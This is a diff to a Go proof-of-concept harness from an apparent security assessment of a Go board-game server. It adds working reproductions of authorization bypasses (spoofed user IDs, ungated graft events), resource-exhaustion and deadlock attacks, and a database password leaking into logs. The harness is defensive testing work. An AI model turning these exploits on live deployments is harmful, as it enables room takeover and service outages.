@@ -11,8 +11,8 @@
 //
 //	go run ./security/poc/harness <finding-id> [flags]
 //
-// Finding IDs: c1 c2 c3 c4 c5 c6 c7 h1 h2 h3 h4 h5 h6 h7 m2 m3 m4 m5 m7 a1 b1
-// Run with no arguments for the full list.
+// Run with no arguments for the full list of finding IDs. Data-race findings
+// (DR-2/DR-3) are reproduced separately with `go test -race ./security/poc/race/`.
 package main
 
 import (
@@ -34,13 +34,17 @@ import (
 
 	"github.com/golab/board/internal/fetch"
 	izip "github.com/golab/board/internal/zip"
+	"github.com/golab/board/pkg/config"
 	"github.com/golab/board/pkg/core"
 	"github.com/golab/board/pkg/core/board"
 	"github.com/golab/board/pkg/core/color"
 	"github.com/golab/board/pkg/core/coord"
 	"github.com/golab/board/pkg/core/parser"
 	evpkg "github.com/golab/board/pkg/event"
+	"github.com/golab/board/pkg/hub"
+	"github.com/golab/board/pkg/logx"
 	"github.com/golab/board/pkg/room"
+	"github.com/golab/board/pkg/room/plugin"
 	"github.com/golab/board/pkg/state"
 	"golang.org/x/net/websocket"
 )
@@ -776,6 +780,207 @@ func pocCS2() {
 	fmt.Println(">> while the owner believes the room is protected. bcrypt rejects >72 bytes; Hash ignores it.")
 }
 
+// nodeCount reports the number of tree nodes in a room's state.
+func nodeCount(r *room.Room) int { return len(r.GetState().Nodes()) }
+
+func settingsVal(buffer int, password string) map[string]any {
+	return map[string]any{
+		"buffer": float64(buffer), "size": float64(19), "nickname": "x",
+		"black": "", "white": "", "komi": "", "password": password,
+	}
+}
+
+// H-6: the graft handler has neither `authorized` nor `outsideBuffer` middleware,
+// so it mutates a PASSWORD-PROTECTED room from an unauthenticated actor, while a
+// properly-gated handler (update_settings) is correctly blocked.
+func pocH6graft() {
+	banner("h6", "graft bypasses the authorized middleware (mutates a password room, unauthenticated)")
+	r := room.NewRoom("h6")
+	r.SetPassword(core.Hash("the-secret")) // room is now protected
+	attacker := "attacker-never-authed"
+
+	// Control: update_settings IS gated by `authorized` -> blocked for the attacker.
+	buf0 := r.GetInputBuffer()
+	us := evpkg.NewEvent("update_settings", settingsVal(9999, "the-secret"))
+	us.SetUser(attacker)
+	r.HandleAny(us)
+	fmt.Printf("update_settings (authorized-gated): buffer %d -> %d  => %s\n",
+		buf0, r.GetInputBuffer(), map[bool]string{true: "BLOCKED (auth works)", false: "changed"}[r.GetInputBuffer() == buf0])
+
+	// graft has no auth middleware -> executes and mutates the tree.
+	n0 := nodeCount(r)
+	g := evpkg.NewEvent("graft", "d4")
+	g.SetUser(attacker)
+	r.HandleAny(g)
+	fmt.Printf("graft (NO auth middleware): nodes %d -> %d  => %s\n",
+		n0, nodeCount(r), map[bool]string{true: ">> BYPASS: graft mutated a password room with no auth", false: "no change"}[nodeCount(r) > n0])
+}
+
+// H-7: unbounded per-room tree growth; each graft also re-serializes the WHOLE
+// tree (O(n)) for broadcast -> O(k^2) work + unbounded memory.
+func pocH7grow() {
+	banner("h7", "Unbounded tree growth + quadratic full-frame rebroadcast")
+	r := room.NewRoom("h7")
+	const k = 4000
+	for i := 0; i < k; i++ {
+		// Diverging 2-move grafts: a varying first move (parent) + a per-iteration
+		// second move keeps adding fresh nodes. smartGraft only dedups exact
+		// (coord,color) children, so there is no ceiling.
+		g := evpkg.NewEvent("graft", coordIdx(i/19)+" "+coordIdx(i))
+		g.SetUser("x")
+		r.HandleAny(g)
+	}
+	nodes := nodeCount(r)
+	sgfLen := len(r.GetState().ToSGF()) // grows with the tree; persisted on every Save
+	_ = r.GenerateFullFrame(state.Full) // walks all N nodes (two O(n) Fmaps) — re-run on EVERY graft
+	fmt.Printf(">> after %d unauthenticated grafts: tree grew to %d nodes (no cap); the serialized SGF is %d bytes.\n", k, nodes, sgfLen)
+	fmt.Println(">> GenerateFullFrame walks all N nodes and is regenerated + broadcast to every client on EVERY graft")
+	fmt.Println(">> (broadcastFullFrameAfter) -> O(k^2) work and unbounded memory; the persisted SGF inflates every Save/Load.")
+}
+
+// coordIdx maps 0..360 to a valid board coordinate (19x19, letters skip 'i').
+func coordIdx(n int) string {
+	letters := "abcdefghjklmnopqrst" // 19 letters, no 'i'
+	n = ((n % 361) + 361) % 361
+	return fmt.Sprintf("%c%d", letters[n/19], n%19+1)
+}
+
+// GL-1 (covers H-8 root): Room.Close() never ends registered plugins, so plugin
+// goroutines/fds leak on room teardown. Demonstrated with a MockPlugin: after
+// Close(), the plugin was never End()ed.
+func pocGL1() {
+	banner("gl1", "Room.Close never ends plugins -> goroutine/fd leak (root of H-8)")
+	r := room.NewRoom("gl1")
+	r.SetLogger(logx.NewDefaultLogger(logx.LogLevelError))
+	mp := plugin.NewMockPlugin()
+	r.RegisterPlugin(mp, map[string]any{"key": "ogs"})
+	fmt.Printf("plugin started: %v\n", mp.IsStarted)
+	_ = r.Close() // teardown path used by the Heartbeat on idle expiry
+	fmt.Printf("after Room.Close(): plugin still started (End NOT called): %v\n", mp.IsStarted)
+	if mp.IsStarted {
+		fmt.Println(">> CONFIRMED: Close() closes conns but never iterates r.plugins/p.End().")
+		fmt.Println(">> For the real OGS plugin this leaks loop/ping/readSocketToChan goroutines + a TCP fd,")
+		fmt.Println(">> pinning the whole room object graph. (H-8's socket-close needs OGS egress to fully exercise.)")
+	}
+}
+
+// DL-1: the hub holds h.mu across a room call that needs a pinned r.mu, so a
+// stuck client + a broadcast freezes the whole hub (new rooms/board loads wedge).
+func pocDL1() {
+	banner("dl1", "Hub freeze: h.mu held across a room call blocked by a stuck client")
+	h, err := hub.NewHub(config.Test(), logx.NewDefaultLogger(logx.LogLevelError))
+	if err != nil {
+		fmt.Println("hub error:", err)
+		return
+	}
+	r := room.NewRoom("stuckroom")
+	stuck := &blockingWriter{EventChannel: evpkg.NewMockEventChannel(), block: make(chan struct{})}
+	defer close(stuck.block)
+	r.RegisterConnection(stuck)
+	h.SetRoom("stuckroom", r)
+
+	go r.Broadcast(evpkg.NewEvent("global", "x")) // pins r.mu on the stuck write
+	time.Sleep(150 * time.Millisecond)
+	go h.ConnCount() // locks h.mu, then calls r.NumConns() -> blocks WHILE holding h.mu
+	time.Sleep(150 * time.Millisecond)
+
+	done := make(chan struct{})
+	go func() { _ = h.GetOrCreateRoom("brand-new"); close(done) }() // needs h.mu
+	select {
+	case <-done:
+		fmt.Println("GetOrCreateRoom completed — hub NOT frozen (unexpected)")
+	case <-time.After(1 * time.Second):
+		fmt.Println(">> CONFIRMED: GetOrCreateRoom blocked ~1s — one stuck client + an unauth GET /api/stats")
+		fmt.Println(">> (ConnCount) pins h.mu, wedging all new connections and board loads hub-wide.")
+	}
+}
+
+// AZ-1: /api/v1 takes evt.User() from the client JSON `userid` (never SetUser),
+// and `authorized` checks GetAuth(that id). Replaying a known-authed id runs
+// privileged handlers on a password-protected room with no password.
+func pocAZ1() {
+	banner("az1", "/api/v1 trusts client userid -> authz bypass / password-room takeover")
+	r := room.NewRoom("az1")
+	r.SetPassword(core.Hash("the-secret"))
+	owner := "owner-conn-uuid" // harvested from the connected_users broadcast
+	r.SetAuth(owner, true)     // owner authenticated (passed checkpassword)
+
+	// Privileged action: update_settings (authorized-gated, and NOT rate-gated by
+	// outsideBuffer). Keep the same password so the room stays protected; change the
+	// input buffer as an observable side effect.
+	privileged := func(user string, buffer int) {
+		e := evpkg.NewEvent("update_settings", settingsVal(buffer, "the-secret"))
+		e.SetUser(user)
+		r.HandleAny(e)
+	}
+
+	// attacker id NOT in auth -> authorized blocks it
+	privileged("random-attacker", 9999)
+	fmt.Printf("update_settings as un-authed id: buffer -> %d  => %s\n", r.GetInputBuffer(),
+		map[bool]string{true: "BLOCKED (auth works)", false: "changed"}[r.GetInputBuffer() != 9999])
+
+	// attacker replays the owner's UUID — exactly the client-supplied `userid` that
+	// apiv1router feeds to HandleAny with no SetUser -> authorized passes
+	privileged(owner, 7777)
+	fmt.Printf("update_settings as spoofed owner UUID: buffer -> %d  => %s\n", r.GetInputBuffer(),
+		map[bool]string{true: ">> BYPASS: privileged action ran on a password room via a spoofed userid", false: "no change"}[r.GetInputBuffer() == 7777])
+}
+
+// AZ-2: enabling a password calls SetAuthAll(), grandfathering every currently
+// connected socket — including one that idled since the room was open.
+func pocAZ2() {
+	banner("az2", "Enabling a password grandfathers all connected (incl. hostile) sockets")
+	r := room.NewRoom("az2")
+	owner := &blockingWriterNB{evpkg.NewMockEventChannel()}
+	attacker := &blockingWriterNB{evpkg.NewMockEventChannel()}
+	ownerID := r.RegisterConnection(owner)
+	attackerID := r.RegisterConnection(attacker) // idling since the room was open
+
+	fmt.Printf("before password: attacker authed = %v\n", r.GetAuth(attackerID))
+	// owner (allowed, room still open) sets a password
+	us := evpkg.NewEvent("update_settings", settingsVal(250, "the-secret"))
+	us.SetUser(ownerID)
+	r.HandleAny(us)
+	fmt.Printf("after owner sets password: attacker authed = %v  => %s\n", r.GetAuth(attackerID),
+		map[bool]string{true: ">> BYPASS: the idling attacker was grandfathered by SetAuthAll", false: "correctly not authed"}[r.GetAuth(attackerID)])
+}
+
+// blockingWriterNB is a non-blocking mock channel (SendEvent always returns nil).
+type blockingWriterNB struct{ evpkg.EventChannel }
+
+func (b *blockingWriterNB) SendEvent(evpkg.Event) error { return nil }
+
+// CS-1: dbConfig.redact() is a no-op, so Config.Redact() leaves the Postgres DSN
+// (with password) intact; cmd/main.go logs it in plaintext at startup.
+func pocCS1() {
+	banner("cs1", "Postgres DSN (password) survives Redact() and is logged in plaintext")
+	dir, err := os.MkdirTemp("", "cs1")
+	if err != nil {
+		fmt.Println("tmp error:", err)
+		return
+	}
+	defer os.RemoveAll(dir) //nolint:errcheck
+	cfgPath := dir + "/c.yaml"
+	dsn := "postgres://board_user:SuperSecretPw@db:5432/board?sslmode=disable"
+	_ = os.WriteFile(cfgPath, []byte("db:\n  type: postgres\n  path: \""+dsn+"\"\n"), 0o600)
+
+	cfg, err := config.New(cfgPath)
+	if err != nil {
+		fmt.Println("config error:", err)
+		return
+	}
+	safe := *cfg
+	safe.Redact() // exactly what cmd/main.go does before logging
+	logged := fmt.Sprintf("%v", safe)
+	fmt.Printf("what cmd/main.go logs after Redact():\n  %s\n", logged)
+	if strings.Contains(logged, "SuperSecretPw") {
+		fmt.Println(">> CONFIRMED: the DB password appears in the redacted config -> written to logs at startup.")
+		fmt.Println(">> (Twitch secret IS redacted; dbConfig.redact() is an empty no-op.)")
+	} else {
+		fmt.Println("password not present (unexpected)")
+	}
+}
+
 // =========================================================================
 // SECOND PASS (new findings) — see SECURITY_ASSESSMENT.md §10
 // =========================================================================
@@ -915,6 +1120,13 @@ var pocs = []struct {
 	{"dr1", "[ext] Concurrent map race on r.nicks via /api/v1 — fatal crash (CONFIRMED)", pocDR1},
 	{"dl2", "[ext] Slow-reader freezes whole room (lock held during ws write) (CONFIRMED)", pocDL2},
 	{"cs2", "[ext] >72-byte password silently disables protection (CONFIRMED)", pocCS2},
+	{"graft", "[High H-6] graft bypasses authorized middleware on a password room (CONFIRMED)", pocH6graft},
+	{"grow", "[High H-7] Unbounded tree growth + quadratic full-frame rebroadcast (CONFIRMED)", pocH7grow},
+	{"gl1", "[High] Room.Close never ends plugins -> leak (root of H-8) (CONFIRMED)", pocGL1},
+	{"dl1", "[High] Hub freeze: h.mu held across a room call blocked by a stuck client (CONFIRMED)", pocDL1},
+	{"az1", "[High] /api/v1 trusts client userid -> password-room takeover (CONFIRMED)", pocAZ1},
+	{"az2", "[High] Enabling a password grandfathers connected sockets (CONFIRMED)", pocAZ2},
+	{"cs1", "[High] Postgres DSN logged in plaintext (Redact no-op) (CONFIRMED)", pocCS1},
 }
 
 func usage() {
@@ -924,7 +1136,7 @@ func usage() {
 	for _, p := range pocs {
 		fmt.Printf("  %-4s %s\n", p.id, p.title)
 	}
-	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7 a1 b1 m4 m7 dl2 cs2  (h6 verifies a mitigation)")
+	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7 a1 b1 m4 m7 dl2 cs2 graft grow gl1 dl1 az1 az2 cs1  (h6 verifies a mitigation)")
 	fmt.Println("need -target (live disposable instance): c1 c3 c4 c7 h1 h2 h3 h4 h5 m2 m3 m5 dr1")
 	fmt.Println("b1 also runs e2e when -target is given (uploads the poison, then you join to brick it)")
 	fmt.Println("\nWARNING: several PoCs crash or exhaust the target. Authorised local testing only.")
